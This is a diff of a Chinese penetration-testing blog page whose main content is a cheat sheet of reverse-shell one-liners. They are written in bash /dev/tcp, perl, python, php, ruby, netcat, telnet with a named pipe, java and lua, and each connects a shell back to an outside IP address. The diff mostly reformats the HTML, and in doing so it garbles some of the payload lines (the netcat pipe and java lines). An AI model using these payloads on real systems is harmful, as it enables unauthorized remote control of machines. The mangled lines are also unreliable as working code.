@@ -1,21 +1,4 @@
-<!DOCTYPE html>
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-<html class="theme-next pisces use-motion" lang="zh-CN">
-<head><meta name="generator" content="Hexo 3.9.0">
+<!DOCTYPE html><html class="theme-next pisces use-motion" lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
@@ -104,18 +87,18 @@
 
 
 
-  <meta name="description" content="反弹的各种姿势。bash版本：1bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1 注意这个是由解析shell的bash完成，所以某些情况下不支持 perl版本:1perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;">
+  <meta name="description" content="反弹的各种姿势。bash版本：1bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1 注意这个是由解析shell的bash完成，所以某些情况下不支持 perl版本:1perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"">
 <meta name="keywords" content="bind,shell">
 <meta property="og:type" content="article">
 <meta property="og:title" content="渗透过程中的端口反弹">
 <meta property="og:url" content="https://evi1cg.github.io/archives/GetShellls.html">
-<meta property="og:site_name" content="Evi1cg&#39;s blog">
-<meta property="og:description" content="反弹的各种姿势。bash版本：1bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1 注意这个是由解析shell的bash完成，所以某些情况下不支持 perl版本:1perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;">
+<meta property="og:site_name" content="Evi1cg's blog">
+<meta property="og:description" content="反弹的各种姿势。bash版本：1bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1 注意这个是由解析shell的bash完成，所以某些情况下不支持 perl版本:1perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:updated_time" content="2019-01-14T14:44:26.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="渗透过程中的端口反弹">
-<meta name="twitter:description" content="反弹的各种姿势。bash版本：1bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1 注意这个是由解析shell的bash完成，所以某些情况下不支持 perl版本:1perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;">
+<meta name="twitter:description" content="反弹的各种姿势。bash版本：1bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1 注意这个是由解析shell的bash完成，所以某些情况下不支持 perl版本:1perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"">
 
 
 
@@ -495,18 +478,18 @@
       
 
       
-        <h2 id="反弹的各种姿势。"><a href="#反弹的各种姿势。" class="headerlink" title="反弹的各种姿势。"></a>反弹的各种姿势。</h2><h3 id="bash版本："><a href="#bash版本：" class="headerlink" title="bash版本："></a>bash版本：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+        <meta name="generator" content="Hexo 3.9.0"><h2 id="反弹的各种姿势。"><a href="#反弹的各种姿势。" class="headerlink" title="反弹的各种姿势。"></a>反弹的各种姿势。</h2><h3 id="bash版本："><a href="#bash版本：" class="headerlink" title="bash版本："></a>bash版本：</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i >& /dev/tcp/10.0.0.1/8080 0>&1</span><br></pre></td></tr></tbody></table></figure>
 <p>注意这个是由解析shell的bash完成，所以某些情况下不支持</p>
-<h3 id="perl版本"><a href="#perl版本" class="headerlink" title="perl版本:"></a>perl版本:</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure>
+<h3 id="perl版本"><a href="#perl版本" class="headerlink" title="perl版本:"></a>perl版本:</h3><figure class="highlight perl"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'</span></span><br></pre></td></tr></tbody></table></figure>
 <a id="more"></a>
-<h3 id="python版本"><a href="#python版本" class="headerlink" title="python版本:"></a>python版本:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure>
-<h3 id="php版本："><a href="#php版本：" class="headerlink" title="php版本："></a>php版本：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure>
-<h3 id="ruby版本："><a href="#ruby版本：" class="headerlink" title="ruby版本："></a>ruby版本：</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></span><br></pre></td></tr></table></figure>
-<h3 id="nc版本："><a href="#nc版本：" class="headerlink" title="nc版本："></a>nc版本：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 223.8.200.234 1234</span><br></pre></td></tr></table></figure>
-<h3 id="nc不使用-e："><a href="#nc不使用-e：" class="headerlink" title="nc不使用-e："></a>nc不使用-e：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mknod /tmp/backpipe p</span><br><span class="line">/bin/sh 0&lt;/tmp/backpipe | nc attackerip listenport 1&gt;/tmp/backpipe</span><br></pre></td></tr></table></figure>
-<h3 id="mknod"><a href="#mknod" class="headerlink" title="mknod:"></a>mknod:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipe</span><br></pre></td></tr></table></figure>
-<h3 id="java版本："><a href="#java版本：" class="headerlink" title="java版本："></a>java版本：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/202.103.243.122/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
-<h3 id="lua版本："><a href="#lua版本：" class="headerlink" title="lua版本："></a>lua版本：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('202.103.243.122','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></span><br></pre></td></tr></table></figure>
+<h3 id="python版本"><a href="#python版本" class="headerlink" title="python版本:"></a>python版本:</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></tbody></table></figure>
+<h3 id="php版本："><a href="#php版本：" class="headerlink" title="php版本："></a>php版本：</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3>&3 2>&3");'<!--&3--></span></span><br></pre></td></tr></tbody></table></figure>
+<h3 id="ruby版本："><a href="#ruby版本：" class="headerlink" title="ruby版本："></a>ruby版本：</h3><figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d>&%d 2>&%d",f,f,f)'<!--&%d--></span></span><br></pre></td></tr></tbody></table></figure>
+<h3 id="nc版本："><a href="#nc版本：" class="headerlink" title="nc版本："></a>nc版本：</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 223.8.200.234 1234</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="nc不使用-e："><a href="#nc不使用-e：" class="headerlink" title="nc不使用-e："></a>nc不使用-e：</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mknod /tmp/backpipe p</span><br><span class="line">/bin/sh 0/tmp/backpipe</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="mknod"><a href="#mknod" class="headerlink" title="mknod:"></a>mknod:</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p && telnet 173.214.173.151 8080 0backpipe</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="java版本："><a href="#java版本：" class="headerlink" title="java版本："></a>java版本：</h3><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5<>/dev/tcp/202.103.243.122/2002;cat <&5 2="" |="" while="" read="" line;="" do="" \$line="">&5 >&5; done"<!--&5--></span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="lua版本："><a href="#lua版本：" class="headerlink" title="lua版本："></a>lua版本：</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('202.103.243.122','1234');os.execute('/bin/sh -i <&3>&3 2>&3');"<!--&3--></span></span><br></pre></td></tr></tbody></table></figure>
       
     </div>
 
@@ -861,7 +844,7 @@
                   
                     
                   
-                  <a href="https://github.com/Ridter" title="GitHub &rarr; https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  <a href="https://github.com/Ridter" title="GitHub → https://github.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -872,7 +855,7 @@
                   
                     
                   
-                  <a href="https://twitter.com/Evi1cg" title="Twitter &rarr; https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                  <a href="https://twitter.com/Evi1cg" title="Twitter → https://twitter.com/Evi1cg" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -883,7 +866,7 @@
                   
                     
                   
-                  <a href="https://weibo.com/Ridter" title="微博 &rarr; https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
+                  <a href="https://weibo.com/Ridter" title="微博 → https://weibo.com/Ridter" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>微博</a>
                 </span>
               
                 <span class="links-of-author-item">
@@ -894,7 +877,7 @@
                   
                     
                   
-                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail &rarr; mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  <a href="mailto:zuotonghk@gmail.com" title="E-Mail → mailto:zuotonghk@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                 </span>
               
             </div>
@@ -946,7 +929,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; 2015 – <span itemprop="copyrightYear">2019</span>
+        <div class="copyright">© 2015 – <span itemprop="copyrightYear">2019</span>
   <span class="with-love" id="animate">
     <i class="fa fa-heart"></i>
   </span>
@@ -1628,5 +1611,6 @@
   <script>
   $("body").backstretch("https://blogpics-1251691280.file.myqcloud.com/imgs/20190121234042.jpg");
   </script>
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script></body>
-</html>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});</script>
+
+<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>
